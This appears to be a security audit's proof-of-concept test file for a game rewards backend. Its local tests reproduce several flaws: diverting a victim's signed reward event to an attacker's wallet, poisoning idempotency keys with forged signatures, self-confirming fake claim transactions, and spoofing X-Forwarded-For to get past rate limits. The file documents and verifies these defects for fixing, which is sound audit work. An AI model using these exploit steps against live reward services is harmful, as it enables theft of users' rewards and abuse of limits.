/** Local-only audit reproductions. Passing means the documented defect exists.
 * No production RPC, persistent DB or real keys. Run from repository root:
 * node --experimental-strip-types --test audit/2026-09-21/poc.test.ts
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { authenticate, getJson, makeWallet, makeTestServer, postJson, startTestApp } from '../../backend/test/helpers.ts';
import { canonicalEventBytes, idempotencyHash } from '../../backend/src/rewards.ts';
import { verifyProofIndexed, leafHash } from '../../backend/src/merkle.ts';
import { clientIp, RateLimiter } from '../../backend/src/http.ts';

async function seal(base: string, epoch: number) {
  const proposal = await postJson(base, '/v1/admin/proposals',
    { type: 'seal-reward-epoch', params: { epoch_id: epoch } }, 'audit-operator');
  assert.equal(proposal.status, 200);
  const approval = await postJson(base, '/v1/admin/proposals/approve',
    { proposal_id: proposal.json.id }, 'audit-superadmin');
  assert.equal(approval.status, 200);
}
const roles = { operatorToken: 'audit-operator', superadminToken: 'audit-superadmin' };

test('H-01: unsigned wallet binding redirects a genuine event into attacker Merkle leaf', async () => {
  const server = makeTestServer();
  const { app, base } = await startTestApp({ ...roles, serverSigningPublicKey: server.publicKeyBase64 });
  try {
    const victim = await authenticate(base, makeWallet());
    const attackerWallet = makeWallet();
    const attacker = await authenticate(base, attackerWallet);
    const original = server.signEvent({ match_id: 'legitimate-match', player_id: 'victim-stable-id',
      wallet_binding_id: victim.json.wallet_binding_id, event_type: 'map_finish', amount_micro: 100,
      occurred_at: Date.now() });
    const redirected = { ...original, wallet_binding_id: attacker.json.wallet_binding_id };
    assert.deepEqual(canonicalEventBytes(original), canonicalEventBytes(redirected));
    assert.equal(idempotencyHash(original), idempotencyHash(redirected));
    // Attacker only sees original signed event, does NOT possess server signing key.
    const result = await postJson(base, '/v1/rewards/events', { events: [redirected] });
    assert.equal(result.json.results[0].status, 'accepted');
    const retry = await postJson(base, '/v1/rewards/events', { events: [original] });
    assert.equal(retry.json.results[0].status, 'duplicate');
    const epoch = result.json.results[0].reward_epoch;
    await seal(base, epoch); // Normal operator workflow, not an attacker privilege.
    const claim = await postJson(base, '/v1/rewards/claim-intent', { epoch_id: epoch }, attacker.json.session_token);
    assert.equal(claim.status, 200);
    assert.equal(claim.json.amount_micro, 100);
    assert.equal(claim.json.leaf_hash, leafHash(attackerWallet.rawPublicKey, 100));
    const epochs = await getJson(base, '/v1/rewards/epochs');
    assert.equal(verifyProofIndexed(claim.json.leaf_hash, claim.json.leaf_index,
      claim.json.merkle_proof, epochs.json[0].merkle_root), true);
    const victimClaim = await postJson(base, '/v1/rewards/claim-intent', { epoch_id: epoch }, victim.json.session_token);
    assert.equal(victimClaim.status, 404);
  } finally { await app.close(); }
});

test('M-01: invalid signature permanently poisons idempotency key for valid retry', async () => {
  const server = makeTestServer();
  const { app, base } = await startTestApp({ serverSigningPublicKey: server.publicKeyBase64 });
  try {
    const event = server.signEvent({ match_id: 'poison', player_id: 'p',
      event_type: 'map_finish', amount_micro: 1, occurred_at: Date.now() });
    const poison = await postJson(base, '/v1/rewards/events', {
      events: [{ ...event, server_signature: Buffer.alloc(64).toString('base64url') }] });
    assert.equal(poison.json.results[0].status, 'rejected_signature');
    const genuine = await postJson(base, '/v1/rewards/events', { events: [event] });
    assert.equal(genuine.json.results[0].status, 'duplicate');
    assert.match(genuine.json.results[0].reason, /rejected_signature/);
  } finally { await app.close(); }
});

test('M-02: self-reported fake transaction becomes confirmed without RPC', async () => {
  const server = makeTestServer();
  const { app, base } = await startTestApp({ ...roles, serverSigningPublicKey: server.publicKeyBase64 });
  try {
    const auth = await authenticate(base, makeWallet());
    const event = server.signEvent({ match_id: 'fake-confirm', player_id: 'p',
      wallet_binding_id: auth.json.wallet_binding_id, event_type: 'map_finish', amount_micro: 100, occurred_at: Date.now() });
    const ingest = await postJson(base, '/v1/rewards/events', { events: [event] });
    const epoch = ingest.json.results[0].reward_epoch;
    await seal(base, epoch);
    const intent = await postJson(base, '/v1/rewards/claim-intent', { epoch_id: epoch }, auth.json.session_token);
    const confirmation = await postJson(base, '/v1/rewards/claim-confirmation', {
      intent_id: intent.json.intent_id, transaction_id: 'not-a-solana-signature', status: 'confirmed',
    }, auth.json.session_token);
    assert.equal(confirmation.status, 200);
    const balance = await getJson(base, '/v1/rewards/balance', auth.json.session_token);
    assert.equal(balance.json.claimed_micro, 100);
    assert.equal(balance.json.available_micro, 0);
  } finally { await app.close(); }
});

test('M-03: TRUST_PROXY=1 trusts attacker first XFF value even from arbitrary socket', () => {
  const old = process.env.TRUST_PROXY;
  try {
    process.env.TRUST_PROXY = '1';
    const limiter = new RateLimiter(1, 0);
    const req = (xff: string) => ({ headers: { 'x-forwarded-for': xff }, socket: { remoteAddress: '192.0.2.1' } }) as any;
    assert.equal(limiter.allow(clientIp(req('198.51.100.1'))), true);
    assert.equal(limiter.allow(clientIp(req('198.51.100.1'))), false);
    assert.equal(limiter.allow(clientIp(req('198.51.100.2'))), true);
    assert.equal(clientIp(req('not-an-ip-address')), 'not-an-ip-address');
  } finally { if (old === undefined) delete process.env.TRUST_PROXY; else process.env.TRUST_PROXY = old; }
});

test('M-04: authentic C++-shaped event without binding is accepted but sealed with zero leaves', async () => {
  const server = makeTestServer();
  const { app, base } = await startTestApp({ ...roles, serverSigningPublicKey: server.publicKeyBase64 });
  try {
    const auth = await authenticate(base, makeWallet());
    await postJson(base, '/v1/wallet/link', { player_id: 'linked-name' }, auth.json.session_token);
    const event = server.signEvent({ match_id: 'cpp-event', player_id: 'linked-name',
      event_type: 'map_finish', amount_micro: 100, occurred_at: Date.now() });
    const ingest = await postJson(base, '/v1/rewards/events', { events: [event] });
    assert.equal(ingest.json.results[0].status, 'accepted');
    await seal(base, ingest.json.results[0].reward_epoch);
    const epochs = await getJson(base, '/v1/rewards/epochs');
    assert.equal(epochs.json[0].leaf_count, 0);
    assert.equal(epochs.json[0].total_micro, 0);
  } finally { await app.close(); }
});
